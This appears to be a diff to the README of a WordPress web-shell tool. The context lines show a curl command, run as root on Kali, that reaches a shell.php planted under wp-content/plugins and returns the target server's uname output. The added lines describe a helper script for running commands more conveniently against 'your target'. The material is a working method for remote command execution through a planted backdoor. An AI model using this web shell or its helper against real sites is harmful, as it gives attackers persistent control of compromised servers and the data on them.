@@ -48,3 +48,8 @@ root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(py
 Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
 * Connection #0 to host 192.168.0.1 left intact
 ```
+
+wpshell_helper.py
+============
+
+Shell helper to run commands more conviniently. Modify the address in the script for your target before running.
